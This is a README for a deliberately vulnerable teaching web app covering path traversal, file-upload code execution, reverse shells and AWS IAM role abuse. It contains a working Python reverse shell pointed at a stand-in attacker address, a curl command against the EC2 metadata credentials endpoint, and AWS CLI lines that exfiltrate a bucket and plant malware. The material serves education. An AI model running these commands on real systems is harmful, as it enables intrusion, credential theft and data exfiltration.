# Vulnerable Web Application Demo

> ⚠️ **Warning:** This is an intentionally vulnerable web application designed for educational purposes only. Do not deploy this in a production environment!

## About This Demo

This application demonstrates common web security vulnerabilities that can occur in real-world applications. It serves as a learning platform to understand how these vulnerabilities work and how they can be exploited.

## 🔓 Identified Vulnerabilities

### 1. Path Traversal Vulnerability

**Issue:** Incorrect nginx configuration allows directory traversal attacks.

**Impact:** Attackers can access any file on the server outside the intended web directory.

**Example:** Try accessing `/static/../../app.py` to view the application source code.

**Root Cause:** The nginx configuration doesn't properly restrict access to parent directories.

> **Try it:** Navigate to `/static/../../app.py` to see the main application file!

---

### 2. Remote Code Execution (RCE)

**Issue:** Poor architecture design allows normal users to overwrite Python files in the resumes directory.

**Impact:** Attackers can upload malicious Python files that get executed on the server, leading to complete system compromise.

**Attack Vector:** Upload a malicious .py file to the resumes directory, which can then be executed by the application.

**Root Cause:** The application allows file uploads without proper validation and places executable Python files in an accessible directory.

**Educational Note:** In a real attack, this could allow an attacker to:
- Execute arbitrary commands on the server
- Access sensitive files and databases
- Install backdoors for persistent access
- Pivot to other systems on the network

---

### 3. Reverse Shell & Remote Command Execution 🐚

**Issue:** RCE vulnerability enables attackers to establish a reverse shell for interactive remote access.

**Impact:** An attacker can maintain persistent, interactive access to the server and execute commands in real-time.

**Attack Scenario:**
1. Exploit the file upload vulnerability to upload a malicious Python script
2. Script establishes a reverse shell connection back to attacker's machine
3. Attacker gains full terminal access to the compromised server
4. Can explore the system, exfiltrate data, and escalate privileges

**Example Reverse Shell Command:**

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker-ip",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

---

### 4. Cloud Security Exploitation (AWS EC2) ☁️

**Issue:** This application runs on an AWS EC2 instance with overly permissive IAM instance role.

**Impact:** Once an attacker gains shell access, they can leverage the EC2 instance's IAM role to access AWS resources beyond the compromised server.

#### 🎯 Cloud Attack Chain

**Step 1: Gain Shell Access**
- Use RCE/Reverse Shell to obtain terminal access on the EC2 instance

**Step 2: Enumerate IAM Credentials**
- Query the EC2 instance metadata service to retrieve temporary credentials:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Step 3: Exploit Overly Permissive Role**

If the instance role has excessive permissions, attackers could:
- Access S3 buckets containing sensitive data (customer info, backups, credentials)
- Read/write DynamoDB tables
- Launch additional EC2 instances for cryptomining
- Modify security groups to open backdoors
- Access Secrets Manager or Parameter Store secrets
- Exfiltrate data from RDS databases
- Modify Lambda functions or IAM policies
- Pivot to other AWS services and accounts

#### ⚠️ Real-World Example

An instance role with `s3:*` permissions could allow an attacker to:

```bash
# List all S3 buckets in the account
aws s3 ls

# Download sensitive data
aws s3 sync s3://company-secrets ./exfiltrated-data

# Upload backdoors or ransomware
aws s3 cp malware.sh s3://production-app/startup.sh
```

This demonstrates the importance of applying the principle of least privilege to IAM roles.

#### 🔐 Common Misconfigurations

- `AdministratorAccess` policy attached to instance role
- Wildcard permissions like `s3:*` or `ec2:*`
- Resource set to `*` instead of specific ARNs
- No conditions on sensitive actions
- Cross-account access without proper restrictions

